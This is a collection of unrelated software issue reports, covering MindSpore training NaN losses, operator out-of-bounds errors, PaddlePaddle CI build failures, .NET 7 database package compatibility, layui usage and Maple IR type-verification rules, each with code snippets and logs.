dist_eval_network = ClassifyCorrectCell(net) if config.run_distribute else None metrics = {""acc""} if config.run_distribute: metrics = {'acc': DistAccuracy(batch_size=config.batch_size, device_num=config.device_num)} if config.net_name == ""se-resnet50"": config.epoch_size = config.train_epoch_size def net_forward(data, label): out = net(data) loss_value = loss_fn(out, label) scaled_loss = loss_scaler.scale(loss_value) return scaled_loss, out grad_fn = ops.value_and_grad(net_forward, None, net.trainable_params(), has_aux=True) #grad_reducer = nn.DistributedGradReducer(opt.parameters, True, 8) def train_step(inputs, targets): (loss_value, logits), grads = grad_fn(inputs, targets) #grads = grad_reducer(grads) loss_value = loss_scaler.unscale(loss_value) #is_finite = amp.all_finite(grads) #if is_finite: #grads = loss_scaler.unscale(grads) #opt(grads) opt(grads) return loss_value def train_net(): epochs = config.epoch_size - config.pretrain_epoch_size jitconfig = ms.JitConfig(jit_level=""O1"", task_sink=True) data_size = dataset.get_dataset_size() sink_process = ms.train.data_sink(train_step, dataset, sink_size=data_size, jit_config=jitconfig) for epoch in range(epochs): epoch_start = time.time() loss = sink_process() epoch_mseconds = (time.time() - epoch_start) * 1000 print(""epoch: %s, loss is %s, epoch_time is %s, setp_time is %s"" % (epoch, loss, epoch_mseconds, epoch_mseconds/data_size), flush=True) if (epoch + 1) % 10 == 0: ckpt_name = ""resnet50-nojit-config-"" + str(epoch) ms.save_checkpoint(net, ckpt_name) epoch: 0, loss is nan, epoch_time is 127048.96640777588, setp_time is 81.3373664582432 epoch: 1, loss is nan, epoch_time is 110906.32772445679, setp_time is 71.00277063025402 epoch: 2, loss is nan, epoch_time is 110899.60956573486, setp_time is 70.99846963235267 epoch: 3, loss is nan, epoch_time is 110891.836643219, setp_time is 70.99349336953841"
用了几年layui了，今天因为偶然回官网看到这个,"吓一跳，然后看完后面的文字描述后发现虚惊一场，因为正常情况下都会刻意让业务代码在模块加载完毕之后执行。其实用了这么久都没发现这样有什么问题。往往需要在其他function中用到这些全局变量，如果全部放进use里面感觉代码又长又难维护。   <code>: //强烈不推荐下面的做法 var laypage, laydate; layui.use(['laypage', 'laydate'], function(){ laypage = layui.laypage; laydate = layui.laydate; });"
"[MS][crowdfunding][assistant][ops] - minor code, test and comment issues for new MD ops","Task minor code, test and comment issues kind/task Task Description This issue lists various minor code, test and comment issues to be fixed. These matters relate to the recent code merged from ""[MS][crowdfunding]"" and ""[assistant][ops]"" PRs for new MindData source ops and ops. Need to use 'color' not 'colour'. c_api_audio_a_to_q_test.cc - test are NOT being added in alphabetical order by audio op name <ol start=""3""> datsets.py - About section and Citation section corrections a) SBDataset - correct mark Citations section header Use of int as parm type Need to investigate and resolve: int should NOT be used a parameter type of external API (nor at IR nor runtime OP level). The following needs to be investigated: <ol start=""5""> Correct file permissions for new audio files Correct the wrongful file permissions for these files: a) audio.h - under mindspore/ccsrc/minddata/dataset/include/dataset change from -rwxrwxr-x to -rw-rw-r-- b) some audio IR files: c) some audio/kernel files: d) Python files: e) Python UTs: <ol start=""6""> comment fixes a) mnist_op.h in mindspore/ccsrc/minddata/dataset/engine/datasetops/source change from: to : Provide missing to_json and from_json support for new datasets a) missing from_json: cityscapes_node.cc div2k_node.cc usps_node.cc sbu_node.cc b) missing to_json: NONE (?) <ol start=""8""> For usages of DataType enums, replace wrongful range value usage of enums to using macros like isNumeric(): <ol start=""9""> Full and proper C++ API and Python API support for Flowers102Dataset !18668:[assistant][ops]New operator implementation, include Flowers102Dataset/ merged just a Python API for Flower102Dataset and based off GeneratorDataset <ol start=""10""> Cleanup includes in bindings.cc, for proper headers within mindspore/ccsrc/minddata/dataset/api/python/bindings/dataset/engine/ir/datasetops/source/bindings.cc <ol start=""11""> 排查报错日志宏是否正确打印日志。 排查OutputType、OutputShape等方法是否正确输出。 test_datasets_iwslt.py wrongly leaves extra files after execution (Added 2021-01-04) After execution of test_datasets_iwslt.py, the following files are generated from test execution and wrongly not deleted:   <code>: ./engine/datasets.py:4394: The CIFAR-10 dataset consists of 60000 32x32 colour images in 10 classes, ./engine/datasets.py:6059: The Flickr8k dataset consists of 8092 colour images. There are 40460 annotations in the Flickr8k.token.txt, ./engine/datasets.py:6094: The Flickr30k dataset consists of 31783 colour images. There are 158915 annotations in ./engine/datasets.py:6227: The Semantic Boundaries Dataset consists of 11355 colour images. There are 8498 images' name in the train.txt, /tests/ut/cpp/dataset$ grep TEST_F c_api_audio_a_to_q_test.cc TEST_F(MindDataTestPipeline, TestAmplitudeToDBPipeline) { TEST_F(MindDataTestPipeline, TestAmplitudeToDBWrongArgs) { TEST_F(MindDataTestPipeline, TestBandBiquadBasic) { TEST_F(MindDataTestPipeline, TestBandBiquadParamCheck) { TEST_F(MindDataTestPipeline, TestAllpassBiquadBasic) { TEST_F(MindDataTestPipeline, TestAllpassBiquadParamCheck) { TEST_F(MindDataTestPipeline, TestBandpassBiquadBasic) { TEST_F(MindDataTestPipeline, TestBandpassBiquadParamCheck) { TEST_F(MindDataTestPipeline, TestBandrejectBiquadBasic) { TEST_F(MindDataTestPipeline, TestBandrejectBiquadParamCheck) { TEST_F(MindDataTestPipeline, TestBassBiquadBasic) { TEST_F(MindDataTestPipeline, TestBassBiquadParamCheck) { TEST_F(MindDataTestPipeline, TestAnglePipeline) { TEST_F(MindDataTestPipeline, TestAnglePipelineError) { TEST_F(MindDataTestPipeline, TestEqualizerBiquadSuccess) { TEST_F(MindDataTestPipeline, TestEqualizerBiquadWrongArgs) { TEST_F(MindDataTestPipeline, TestLowpassBiquadSuccess) { TEST_F(MindDataTestPipeline, TestLowpassBiquadWrongArgs) { TEST_F(MindDataTestPipeline, TestFrequencyMaskingPipeline) { TEST_F(MindDataTestPipeline, TestFrequencyMaskingWrongArgs) { TEST_F(MindDataTestPipeline, TestComplexNormBasic) { TEST_F(MindDataTestPipeline, TestComplexNormWrongArgs) { TEST_F(MindDataTestPipeline, TestContrastBasic) { TEST_F(MindDataTestPipeline, TestContrastParamCheck) { TEST_F(MindDataTestPipeline, TestDeemphBiquadPipeline) { TEST_F(MindDataTestPipeline, TestDeemphBiquadWrongArgs) { TEST_F(MindDataTestPipeline, TestHighpassBiquadSuccess) { TEST_F(MindDataTestPipeline, TestHighpassBiquadWrongArgs) { TEST_F(MindDataTestPipeline, TestMuLawDecodingBasic) { TEST_F(MindDataTestPipeline, TestMuLawDecodingWrongArgs) { TEST_F(MindDataTestPipeline, TestLfilterPipeline) { TEST_F(MindDataTestPipeline, TestLfilterWrongArgs) { TEST_F(MindDataTestPipeline, TestDCShiftPipeline) { TEST_F(MindDataTestPipeline, TestDCShiftPipelineError) { TEST_F(MindDataTestPipeline, TestBiquadBasic) { TEST_F(MindDataTestPipeline, TestBiquadParamCheck) { audio.h: explicit MuLawDecoding(int quantization_channels = 256); audio.h: explicit TimeStretch(float hop_length = std::numeric_limits&lt;float&gt;::quiet_NaN(), int n_freq = 201, mindspore/ccsrc/minddata/dataset/audio/ir/kernels$ ls -l bandpass_biquad_ir.* angle_ir.* highpass* dc_shift_ir.* CMakeLists.txt -rwxrwxr-x 1 cathwong cathwong 1118 Aug 18 11:22 angle_ir.cc -rwxrwxr-x 1 cathwong cathwong 1541 Aug 18 11:22 angle_ir.h -rwxrwxr-x 1 cathwong cathwong 2042 Aug 18 11:22 bandpass_biquad_ir.cc -rwxrwxr-x 1 cathwong cathwong 1914 Aug 18 11:22 bandpass_biquad_ir.h -rwxrwxr-x 1 cathwong cathwong 788 Sep 14 10:41 CMakeLists.txt -rw-rw-r-- 1 cathwong cathwong 1574 Sep 13 09:41 dc_shift_ir.cc -rwxrwxr-x 1 cathwong cathwong 1660 Sep 13 09:41 dc_shift_ir.h -rwxrwxr-x 1 cathwong cathwong 1853 Sep 10 16:33 highpass_biquad_ir.cc -rwxrwxr-x 1 cathwong cathwong 1855 Sep 10 16:33 highpass_biquad_ir.h mindspore/ccsrc/minddata/dataset/audio/kernels$ ls -lt bandpass_biquad_op.* highpass_biquad_op.* -rw-rw-r-- 1 cathwong cathwong 2600 Sep 10 16:33 highpass_biquad_op.cc -rwxrwxr-x 1 cathwong cathwong 1631 Sep 10 16:33 highpass_biquad_op.h -rwxrwxr-x 1 cathwong cathwong 2651 Aug 18 11:22 bandpass_biquad_op.cc -rwxrwxr-x 1 cathwong cathwong 1975 Aug 18 11:22 bandpass_biquad_op.h /mindspore/mindspore/dataset/audio$ ls -l *.py -rw-rw-r-- 1 cathwong cathwong 953 Sep 10 16:33 __init__.py -rwxrwxr-x 1 cathwong cathwong 26253 Sep 14 10:41 transforms.py -rw-rw-r-- 1 cathwong cathwong 828 Aug 18 11:22 utils.py -rwxrwxr-x 1 cathwong cathwong 12376 Sep 14 10:41 validators.py tests/ut/python/dataset$ ls -l test_angle.py test_highpass_biquad.py -rwxrwxr-x 1 cathwong cathwong 3389 Aug 18 11:22 test_angle.py -rwxrwxr-x 1 cathwong cathwong 6054 Sep 10 16:33 test_highpass_biquad.py // @param std::string folder_path - dir directory of mnist // @param std::string folder_path - directory of mnist /mindspore/ccsrc/minddata/dataset/audio$ grep -nHR ' &lt;= DataType::DE_FLOAT64' ./ ./kernels/mu_law_decoding_op.cc:31: if (input-&gt;type().value() &gt;= DataType::DE_INT8 &amp;&amp; input-&gt;type().value() &lt;= DataType::DE_FLOAT64) { ./kernels/fade_op.cc:32: DataType::DE_INT8 &lt;= input-&gt;type().value() &amp;&amp; input-&gt;type().value() &lt;= DataType::DE_FLOAT64, #ifndef ENABLE_ANDROID tests/ut/data/dataset/testIWSLT/IWSLT2016/texts/de/en/de-en/IWSLT16.TED.tst2013.de-en tests/ut/data/dataset/testIWSLT/IWSLT2016/texts/de/en/de-en/IWSLT16.TED.tst2014.de-en tests/ut/data/dataset/testIWSLT/IWSLT2016/texts/de/en/de-en/train.de-en tests/ut/data/dataset/testIWSLT/IWSLT2017/texts/DeEnItNlRo/DeEnItNlRo/DeEnItNlRo-DeEnItNlRo/IWSLT17.TED.dev2010.de-en tests/ut/data/dataset/testIWSLT/IWSLT2017/texts/DeEnItNlRo/DeEnItNlRo/DeEnItNlRo-DeEnItNlRo/IWSLT17.TED.tst2010.de-en tests/ut/data/dataset/testIWSLT/IWSLT2017/texts/DeEnItNlRo/DeEnItNlRo/DeEnItNlRo-DeEnItNlRo/train.de-en"
 .NET 7 升级问题记录集,简述 2022年11月08日， 已经全面支持了 版本，但可能还存在一些未知的问题，所以这里的贴进行跟踪到 2023年01月01日。 问题清单 数据库 经过测试，在 下各数据库包情况： 正常运行的数据库（及拓展包版本）： ：Microsoft.EntityFrameworkCore.SqlServer ：Microsoft.EntityFrameworkCore.Sqlite ：Microsoft.EntityFrameworkCore.Cosmos ：Microsoft.EntityFrameworkCore.InMemory ：Npgsql.EntityFrameworkCore.PostgreSQL ：FirebirdSql.EntityFrameworkCore.Firebird ：Pomelo.EntityFrameworkCore.MySql ：Oracle.EntityFrameworkCore 不能正常运行的数据库包： ：MySql.EntityFrameworkCore 不能正常运行 ： 不能正常运行 <details> <summary> 2022年11月09日： PostgreSQL 拓展暂未正式支持 .NET7.0.0 版本 【已解决】</summary> <div> 问题描述： <del> 拓展 暂未正式支持 版本</del> 反馈时间： 2022年11月09日 2022年11月10日，已解决 相关工单： #I6075S:脚手架【furionapi】net7生成的项目，集成PostgreSql，报无法加载程序集异常。 解决方案： <del>安装 版本</del>。 2022年11月10日，Npgsql.EntityFrameworkCore.PostgreSQL 发布了 版本。 </details> <details> <summary> 2022年11月09日： Oracle 拓展暂未正式支持 .NET7.0.0 版本 【已解决】</summary> <div> 问题描述： <del> 拓展 暂未正式支持 版本</del> 反馈时间： 2022年11月09日 2022年12月21日，已解决 相关工单： #I5ZZDS:EFCore 7.0 批量删除 ExecuteDeleteAsync 出错，Oracle 数据库 解决方案： 2022年12月21日，Oracle.EntityFrameworkCore 发布了 版本。 </details> <details> <summary> 2022年11月09日： Mysql 拓展暂未正式支持 .NET7.0.0 版本 【部分解决】</summary> <div> 问题描述： 拓展 和 暂未正式支持 版本 反馈时间： 2022年11月09日 2022年11月17日，部分已解决 相关工单： 无 解决方案： 如果使用的是 暂未提供 .NET7.0.0 版本。 <del>如果是 暂未提供 .NET7.0.0 版本</del> 2022年11月17日，Pomelo.EntityFrameworkCore.MySql 发布了 版本。 2022年12月15日，Pomelo.EntityFrameworkCore.MySql 发布了 版本。 </details>   <code>: Furion .NET7 .NET7 SqlServer v7.0.0 Sqlite v7.0.0 Cosmos v7.0.0 InMemoryDatabase v7.0.0 PostgreSQL v7.0.0 Firebird v9.1.0 MySql v7.0.0-silver.1 Oracle v7.21.8 MySql Dm Microsoft.EntityFrameworkCore.Dm PostgreSQL Npgsql.EntityFrameworkCore.PostgreSQL .NET7.0.0 Npgsql.EntityFrameworkCore.PostgreSQL v7.0.0-rc2 v7.0.0 Oracle Oracle.EntityFrameworkCore .NET7.0.0 v7.21.8 Mysql Pomelo.EntityFrameworkCore.MySql MySql.EntityFrameworkCore .NET7.0.0 MySql.EntityFrameworkCore Pomelo.EntityFrameworkCore.MySql v7.0.0-alpha.1 v7.0.0-silver.1
"12 operators, such as addn, have out-of-bounds problems.",": /device gpu + pynative模式 : -- MindSpore version :1.3.0 -- Python version :Python 3.7.5 -- OS platform and distribution :Linux euleros2u3-cbg 3.10.0-514.44.5.10.h254.x86 -- GCC/Compiler version : pytest -s test_addn.py pytest -s test_argmax.py pytest -s test_assignadd.py等 addn等12个算子出现越界问题，涉及80条用例 test pass   <code>: def test_addn_float64_gpu(): fact = AddNFactory(input_shape=(128, 128, 3, 3), n=2, dtype=np.float64) fact.forward_cmp() &gt; fact.grad_cmp() ../operations/test_addn.py:506: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/addn_ops.py:78: in grad_cmp out_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/addn_ops.py:54: in grad_mindspore_impl input_grad = grad_net(input_x_me, out_grad) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:399: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:340: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:377: in after_grad out = _pynative_exec(fn, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0x7fc5c9bc7850&gt; obj = WrapOp&lt;&gt; args = (Tensor(shape=[128, 128, 3, 3], dtype=Float64, value= [[[[ 3.46613864e-01, -1.40577524e+00, -1.26048805e-01], [-1.5...1], [ 4.19324361e-01, -3.51432660e-01, -2.17644661e-01], [-8.22777379e-02, -2.24433264e-01, 5.37008596e-01]]]])) kwargs = {} def __call__(self, obj, *args, **kwargs): args = args + tuple(kwargs.values()) &gt; return self._executor(obj, args) E RuntimeError: mindspore/core/base/base_ref.h:256 operator[]] Out of the size of the tuple."
keras的LSTM模型转onnx后，再转ms模型无法推理,"keras搭建了一套LSTM模型 由于mindspore lite不支持keras的h5模型直接转ms模型，所以先转换成onnx，转换代码如下 转换后的模型如下 /mode graph   <code>: def build_new_OCR(modelPath): layer1_num = 500 layer2_num = 100 number_of_classes = 7356 data_fixed_length = 100 print(""building model"") model = Sequential() # 单向或双向LSTM/GRU,input_shape的含义(num_timesteps, num_features) model.add(LSTM(layer1_num, return_sequences=True, input_shape=(data_fixed_length, 6))) #model.add(GRU(layer1_num, return_sequences=True, input_shape=(data_fixed_length, 6))) #model.add(Bidirectional(LSTM(layer1_num, return_sequences=True), merge_mode='concat', input_shape=(data_fixed_length, 6))) #model.add(Bidirectional(GRU(layer1_num, return_sequences=True), merge_mode='concat', input_shape=(data_fixed_length, 6))) model.add(Flatten()) model.add(Dense(200, activation='relu')) model.add(Dense(number_of_classes, activation='softmax')) return model import keras2onnx onnx_model = keras2onnx.convert_keras(model, model.name, target_opset=9) auto inputs = model-&gt;GetInputs(); vector&lt;int64_t&gt; resize_shape = {1, rowNum, calNum}; std::vector&lt;std::vector&lt;int64_t&gt;&gt; new_shapes; new_shapes.push_back(resize_shape); model-&gt;Resize(inputs, new_shapes);"
2.2 ConfigurationProperties 不需要被声明为 @@Configuration 或者 @Component,pig版本: 2.5.0 操作系统: macos 是否修改包名: 否 2.2.0 ConfigurationProperties 不需要被声明为 @configuration 或者 @Component，也就是会自动扫描 @ConfigurationProperties 类型 2.2.1 关闭了自动扫描， 配置扫描属性 开启   <code>: @ConfigurationPropertiesScan
CI mark failed compiled PR as success.,"In https://github.com/PaddlePaddle/Paddle/pull/5411, https://paddleci.ngrok.io/viewLog.html?buildId=17380&amp;buildTypeId=Paddle_PrCi. The CI failed in compile. And we saw a bunch of Not Run However, the commit is still marked as passed in the PR.   <code>: [21:58:12][Step 1/1] [ 25%] Building CXX object paddle/framework/CMakeFiles/eigen_test.dir/eigen_test.cc.o [21:58:13][Step 1/1] /paddle/paddle/framework/lod_tensor.cc: In function 'void paddle::framework::AppendLoD(paddle::framework::LoD*, const LoD&amp;)': [21:58:13][Step 1/1] /paddle/paddle/framework/lod_tensor.cc:178:38: error: converting to 'const value_type {aka const thrust::host_vector&lt;long unsigned int, thrust::system::cuda::experimental::pinned_allocator&lt;long unsigned int&gt; &gt;}' from initializer list would use explicit constructor 'thrust::host_vector&lt;T, Alloc&gt;::host_vector(thrust::host_vector&lt;T, Alloc&gt;::size_type) [with T = long unsigned int; Alloc = thrust::system::cuda::experimental::pinned_allocator&lt;long unsigned int&gt;; thrust::host_vector&lt;T, Alloc&gt;::size_type = long unsigned int]' [21:58:13][Step 1/1] *lod = LoD(lod_length.size(), {0}); [21:58:13][Step 1/1] ^ [21:58:13][Step 1/1] paddle/framework/CMakeFiles/lod_tensor.dir/build.make:62: recipe for target 'paddle/framework/CMakeFiles/lod_tensor.dir/lod_tensor.cc.o' failed [21:58:13][Step 1/1] make[2]: *** [paddle/framework/CMakeFiles/lod_tensor.dir/lod_tensor.cc.o] Error 1 [21:58:13][Step 1/1] CMakeFiles/Makefile2:9427: recipe for target 'paddle/framework/CMakeFiles/lod_tensor.dir/all' failed [21:58:13][Step 1/1] make[1]: *** [paddle/framework/CMakeFiles/lod_tensor.dir/all] Error 2 [21:58:13][Step 1/1] make[1]: *** Waiting for unfinished jobs.... [21:58:18][Step 1/1] [ 25%] Linking CXX executable eigen_test ... [21:58:43][Step 1/1] 3/267 Test #7: CrossMapNormalOpTest ........................***Not Run 0.00 sec [21:58:43][Step 1/1] Start 8: TensorShapeTest [21:58:43][Step 1/1] Could not find executable TensorShapeTest [21:58:43][Step 1/1] Looked in the following places: [21:58:43][Step 1/1] TensorShapeTest [21:58:43][Step 1/1] TensorShapeTest [21:58:43][Step 1/1] Release/TensorShapeTest [21:58:43][Step 1/1] Release/TensorShapeTest [21:58:43][Step 1/1] Debug/TensorShapeTest [21:58:43][Step 1/1] Debug/TensorShapeTest [21:58:43][Step 1/1] MinSizeRel/TensorShapeTest [21:58:43][Step 1/1] MinSizeRel/TensorShapeTest [21:58:43][Step 1/1] RelWithDebInfo/TensorShapeTest [21:58:43][Step 1/1] RelWithDebInfo/TensorShapeTest [21:58:43][Step 1/1] Deployment/TensorShapeTest [21:58:43][Step 1/1] Deployment/TensorShapeTest [21:58:43][Step 1/1] Development/TensorShapeTest [21:58:43][Step 1/1] Development/TensorShapeTest [21:58:43][Step 1/1] 4/267 Test #8: TensorShapeTest .............................***Not Run 0.00 sec [21:58:44][Step 1/1] Start 9: TensorTypeTest [21:58:44][Step 1/1] Unable to find executable: TensorTypeTest [21:58:44][Step 1/1] Unable to find executable: BufferArgTest [21:58:44][Step 1/1] Could not find executable TensorTypeTest [21:58:44][Step 1/1] Unable to find executable: FunctionTest [21:58:44][Step 1/1] Looked in the following places: [21:58:44][Step 1/1] Unable to find executable: ContextProjectionOpTest [21:58:44][Step 1/1] TensorTypeTest [21:58:44][Step 1/1] TensorTypeTest [21:58:44][Step 1/1] Release/TensorTypeTest [21:58:44][Step 1/1] Release/TensorTypeTest [21:58:44][Step 1/1] Debug/TensorTypeTest [21:58:44][Step 1/1] Debug/TensorTypeTest [21:58:44][Step 1/1] MinSizeRel/TensorTypeTest [21:58:44][Step 1/1] MinSizeRel/TensorTypeTest [21:58:44][Step 1/1] RelWithDebInfo/TensorTypeTest [21:58:44][Step 1/1] RelWithDebInfo/TensorTypeTest [21:58:44][Step 1/1] Deployment/TensorTypeTest [21:58:44][Step 1/1] Deployment/TensorTypeTest [21:58:44][Step 1/1] Development/TensorTypeTest [21:58:44][Step 1/1] Development/TensorTypeTest [21:58:44][Step 1/1] 5/267 Test #9: TensorTypeTest ..............................***Not Run 0.00 sec ..."
seqtext_printer_evaluator如何指定输出格式,"文档里面写到seqtext_printer_evaluator可以支持三种输出格式： sequence without sub-sequence, and there is probability. .. code-block:: python sequence without sub-sequence, and there is not probability. .. code-block:: python <ol start=""3""> sequence with sub-sequence, and there is not probability. .. code-block:: python 请问如何指定输出格式，输出sub-sequence以及对应的probability？   <code>: id \t prob space_seperated_tokens_from_dictionary_according_to_seq id \t space_seperated_tokens_from_dictionary_according_to_seq id \t space_seperated_tokens_from_dictionary_according_to_sub_seq \t \t space_seperated_tokens_from_dictionary_according_to_sub_seq ..."
用.so库报错version `GLIBC_2.14' not found,"之前用.so库可以运行的，然后更改了网络结构，重新编译，报下面的错。   <code>: Traceback (most recent call last): File ""***/.BCloud/bcloud/Client/bcloud"", line 21, in &lt;module&gt; import socket File ""***/paddle/python27/lib/python2.7/socket.py"", line 47, in &lt;module&gt; import _socket ImportError: /lib64/libc.so.6: version `GLIBC_2.14' not found (required by ***/paddle/python27/lib/python2.7/lib-dynload/_socket.so)"
manylinux1 teamcity fails on paddle_inference_api_impl.cc,"https://paddleci.ngrok.io/viewLog.html?buildId=37127&amp;tab=buildLog&amp;buildTypeId=Manylinux1_CpuAvxCp27cp27mu&amp;logTab=tree&amp;filter=all&amp;_focus=5773 https://paddleci.ngrok.io/project.html?projectId=Manylinux1&amp;tab=projectOverview   <code>: [02:04:48] [Step 1/5] /paddle/paddle/contrib/inference/paddle_inference_api_impl.cc: In member function ‘virtual std::unique_ptr&lt;paddle::PaddlePredictor&gt; paddle::PaddlePredictorImpl::Clone()’: [02:04:48] [Step 1/5] /paddle/paddle/contrib/inference/paddle_inference_api_impl.cc:143:10: error: invalid conversion from ‘std::unique_ptr&lt;paddle::PaddlePredictorImpl&gt;’ to ‘std::unique_ptr&lt;paddle::PaddlePredictorImpl&gt;&amp;&amp;’ [-fpermissive] [02:04:48] [Step 1/5] return cls; [02:04:48] [Step 1/5] ^ [02:04:48] [Step 1/5] In file included from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/memory:81:0, [02:04:48] [Step 1/5] from /paddle/paddle/contrib/inference/paddle_inference_api_impl.h:18, [02:04:48] [Step 1/5] from /paddle/paddle/contrib/inference/paddle_inference_api_impl.cc:24: [02:04:48] [Step 1/5] /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/bits/unique_ptr.h:169:2: error: initializing argument 1 of ‘std::unique_ptr&lt;_Tp, _Dp&gt;::unique_ptr(std::unique_ptr&lt;_Up, _Ep&gt;&amp;&amp;) [with _Up = paddle::PaddlePredictorImpl; _Ep = std::default_delete&lt;paddle::PaddlePredictorImpl&gt;; &lt;template-parameter-2-3&gt; = void; _Tp = paddle::PaddlePredictor; _Dp = std::default_delete&lt;paddle::PaddlePredictor&gt;]’ [-fpermissive] [02:04:48] [Step 1/5] unique_ptr(unique_ptr&lt;_Up, _Ep&gt;&amp;&amp; __u) noexcept [02:04:48] [Step 1/5] ^ [02:04:48] [Step 1/5] /paddle/paddle/contrib/inference/paddle_inference_api_impl.cc:143:10: error: cannot convert ‘cls’ from type ‘std::unique_ptr&lt;paddle::PaddlePredictorImpl&gt;’ to type ‘std::unique_ptr&lt;paddle::PaddlePredictorImpl&gt;&amp;&amp;’ [02:04:48] [Step 1/5] return cls; [02:04:48] [Step 1/5] ^ [02:04:49] [Step 1/5] /paddle/paddle/contrib/inference/paddle_inference_api_impl.cc:144:1: error: control reaches end of non-void function [-Werror=return-type] [02:04:49] [Step 1/5] }"
bring up maple ir verifier by picking up the code from incubator,"In incubator, under maple_ir/src is verf_driver.cpp, which is used to build the stand-alone mplverf (maple verifier). It does its work by calling the Verify() member function of each instruction. It also invokes a number of verification functions that reside only in incubator's mir_nodes.cpp. In particular, there is this important description of the rules being used in the verification in that same file:   <code>: // Start of type verification for Maple IR nodes. // // General rules: // // 1. For binary operations, the types of the two operands must be compatible. // // 2. In checking type compatibility, other than identical types, the types in // each of the following group are compatible with each other: // [i32, u32, ptr, ref, a32] // [i64, u64, ptr, ref, a64] // // 3. dynany is compatiable with any dyn* type. // // 4. u1, i8, u8, i16, u16 must not be types of arithmetic operations, because // many machines do not provide instructions for such types as they lack such // register sizes. Similarly, these types must not be used as result types for // any read instructions: dread/iread/regread/ireadoff/ireadfpoff. // // 5. When an opcode only specifies one type (which is called the result type), // it expects both operands and results to be of this same type. Thus, the // types among the operands and this result type must be compatible. // // 6. When an opcode specifies two types, the additional (second) type is // the operand type. The types of the operands and the operand type must be // compatible. // // 7. The opcodes addrof, addroflabel, addroffunc and iaddrof form addresses. // Thus, their result type must be in [ptr,ref,a32,a64]. // // 8. The opcodes bnot, extractbits, sext, zext, lnot must have result type in // [i32, u32, i64, u64]. // // 9. The opcodes abs, neg must have result type in // [i32, u32, i64, u64, f32, f64]. // // 10. The opcodes recip, sqrt must have result type in [f32, f64]. // // 11. The opcodes ceil, floor, round, trunc must have result-type in // [i32, u32, i64, u64] and operand-type in [f32, f64]. // // 12. The opcodes add, div, sub, mpy, max, min must have result-type in // [i32, u32, i64, u64, f32, f64]. // // 13. The opcodes eq, ge, gt, le, lt, ne must have result-type in // any signed or unsigned integer type; they also specifies operand-type, and // this operand-type and the types of their two operands must be compatible. // // 14. The opcodes ashr, band, bior, bxor, depositbits, land, lior, lshr, shl, // rem must have result-type in [i32, u32, i64, u64]. // // 15. select's result-type and the types of its second and third operands must // be compatible; its first operand must be of integer type. // // 16. array's result-type must be in [ptr,ref,a32,a64]; the type of &lt;opnd0&gt; must // also be in [ptr,ref,a32,a64]; the types of the rest of the operands must be in // [i32, u32, i64, u64]. // // 17. The operand of brfalse, trfalse must be of integer type. // // 18. The operand of switch, rangegoto must be in [i32, u32, i64, u64]. code"
关于ms.jvp的问题,"【Issues Section】/【问题文档片段】 【Existing Issues】/【存在的问题】 上面这段代码可以正常工作，但是如果我把f换成其中含有网络，例如 就会报错。但是如果使用PYNATIVE_MODE，就都不会报错。 我该如何更改我的代码，我希望依然能在nn.Cell中使用ms.jvp函数 <ol start=""4""> 【Expected Result】【预期结果】   <code>: import mindspore.nn as nn import mindspore.ops as ops import mindspore as ms ms.set_context(mode=ms.GRAPH_MODE, device_target=""GPU"") net=nn.Dense(10,100) x=ops.Tensor(np.ones((120,10)).astype(np.float32)) @ms.ms_function def f(x): return x+2 class JvpNet(nn.Cell): def __init__(self, f): super().__init__() self.f = f def construct(self, x): out, f_x = ms.jvp(self.f, x,(ops.ones_like(x))) return out, f_x print(ms.jvp(f, x, ops.ones_like(x))) print(JvpNet(f)(x)) import mindspore.nn as nn import mindspore.ops as ops import mindspore as ms ms.set_context(mode=ms.GRAPH_MODE, device_target=""GPU"") net=nn.Dense(10,100) x=ops.Tensor(np.ones((120,10)).astype(np.float32)) @ms.ms_function def f(x): return net(x) class JvpNet(nn.Cell): def __init__(self, f): super().__init__() self.f = f def construct(self, x): out, f_x = ms.jvp(self.f, x,(ops.ones_like(x))) return out, f_x print(ms.jvp(f, x, ops.ones_like(x))) print(JvpNet(f)(x))"
NCCL_LAUNCH_MODE=PARALLEL 环境变量打开，多卡下容易hang住,"paddle version:1.3.0 在transformer，image_classification, deeplabv3+ 都会出现；   <code>: +-------------------------------+----------------------+----------------------+ | 4 Tesla P40 Off | 00000000:49:00.0 Off | 0 | | N/A 41C P0 57W / 250W | 21729MiB / 22912MiB | 100% Default | +-------------------------------+----------------------+----------------------+ | 5 Tesla P40 Off | 00000000:4A:00.0 Off | 0 | | N/A 38C P0 57W / 250W | 21729MiB / 22912MiB | 100% Default | +-------------------------------+----------------------+----------------------+ | 6 Tesla P40 Off | 00000000:4B:00.0 Off | 0 | | N/A 38C P0 58W / 250W | 21729MiB / 22912MiB | 100% Default | +-------------------------------+----------------------+----------------------+ | 7 Tesla P40 Off | 00000000:4C:00.0 Off | 0 | | N/A 38C P0 51W / 250W | 21729MiB / 22912MiB | 0% Default"
